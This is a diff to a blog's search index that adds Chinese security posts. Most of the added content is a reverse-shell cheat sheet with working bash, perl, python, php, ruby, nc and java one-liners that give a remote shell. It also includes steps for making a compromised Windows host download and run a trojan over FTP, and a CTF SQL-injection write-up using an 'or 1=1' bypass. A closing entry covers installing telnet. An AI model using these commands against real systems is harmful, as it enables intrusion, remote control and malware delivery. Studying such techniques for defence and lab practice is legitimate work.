@@ -1,6 +1,33 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Linux反弹shell的10种姿势]]></title>
+    <url>%2F2017%2F07%2F21%2FLinux%E5%8F%8D%E5%BC%B9shell%E7%9A%8410%E7%A7%8D%E5%A7%BF%E5%8A%BF%2F</url>
+    <content type="text"><![CDATA[bash版本1bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1 perl版本1perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;' python版本1python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' php版本1php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' ruby版本1ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)' nc版本1nc -e /bin/sh 10.0.0.1 1234 1rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f 1nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999 java版本123r = Runtime.getRuntime()p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])p.waitFor() 实例在Webshell中执行系统命令不方便时，可以考虑反弹shell到Windows主机上执行命令，Windows（ip：192.168.1.100）使用nc开启端口监听：1nc.exe -v -l -p 9999 Linux使用上面的方法反弹shell，例如使用nc反弹：1nc -e /bin/sh 192.168.1.100 1234]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[FTP传马]]></title>
+    <url>%2F2017%2F07%2F18%2FFTP%E4%BC%A0%E9%A9%AC%2F</url>
+    <content type="text"><![CDATA[如果能够执行远程计算机的系统命令，并且我们有一台FTP服务器，可以使用如下的方法下载FTP木马到远程计算机执行。在远程服务器上依次执行如下命令，将在C:\Windows\temp目录下，创建a.txt的文件。123456echo open ip地址 &gt;&gt; a.txt echo 123 &gt;&gt; a.txt echo 123 &gt;&gt; a.txt echo bin &gt;&gt; a.txt echo get muma.exe echo bye &gt;&gt; a.txt 注释如下：登陆FTP服务器用户名密码开始下载灰鸽子木马关闭FTP服务器 现在我们在远程计算机上执行下面的命令：ftp -s:c:\a.txt，意思是，读取a.txt里的参数，执行ftp命令，命令执行完后，木马文件muma.exe就下载到远程计算机里了，然后执行木马文件即可。]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[网络安全实验室-注入关]]></title>
+    <url>%2F2017%2F07%2F13%2F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4-%E6%B3%A8%E5%85%A5%E5%85%B3%2F</url>
+    <content type="text"><![CDATA[地址http://hackinglab.cn/ShowQues.php?type=sqlinject 第一题最简单的SQL注入分值: 100Tips题目里有简单提示。writeup：很简单，直接万能口令绕过。用户名：admin’ or 1=1 #密码：任意字符 第二题最简单的SQL注入(熟悉注入环境)分值: 100最简单的SQL注入writeup：直接 后面跟上 “or 1=1”。参数id存在注入。 第三题防注入分值: 300小明终于知道，原来黑客如此的吊，还有sql注入这种高端技术，因此他开始学习防注入！writeup：本题添加了防注入代码，过滤掉了危险的单引号。 第五题邂逅分值: 350小明今天出门看见了一个漂亮的帅哥和漂亮的美女，于是他写到了他的日记本里。writeup：]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>CTF SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[telnet安装]]></title>
     <url>%2F2017%2F07%2F11%2Ftelnet%E5%AE%89%E8%A3%85%2F</url>
     <content type="text"><![CDATA[错误提示：1'telnet' is not recognized as an internal or external command 报错原因：在Win7, Vista, Windows Server 2008 R2上, telnet不是默认安装的，手动安装既可以解决问题。解决方案：1.点击Start-&gt;Control Panel-&gt;Programs;2.Turn Windows Features on or off;3.在列表中, 向下滚动, 选择Telnet Client;4.点击OK, 开始安装.]]></content>
